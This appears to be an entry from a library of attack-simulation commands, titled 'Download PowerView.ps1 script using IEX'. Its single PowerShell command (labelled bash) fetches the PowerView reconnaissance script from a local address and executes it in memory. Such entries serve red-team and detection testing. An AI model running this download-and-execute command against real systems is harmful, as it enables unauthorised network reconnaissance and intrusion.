---
id: 82b19fc7-1069-41e8-8010-16b8d735189a
name: Download PowerView.ps1 script using IEX
type: command
executor: bash
data: IEX([Net.Webclient]::new().DownloadString("http://127.0.0.1/PowerView.ps1"))
output: null
created_at: '2023-04-06T03:56:31.210672+00:00'
updated_at: '2023-04-10T20:37:59.636848+00:00'
---

# Download PowerView.ps1 script using IEX

```bash
IEX([Net.Webclient]::new().DownloadString("http://127.0.0.1/PowerView.ps1"))
```
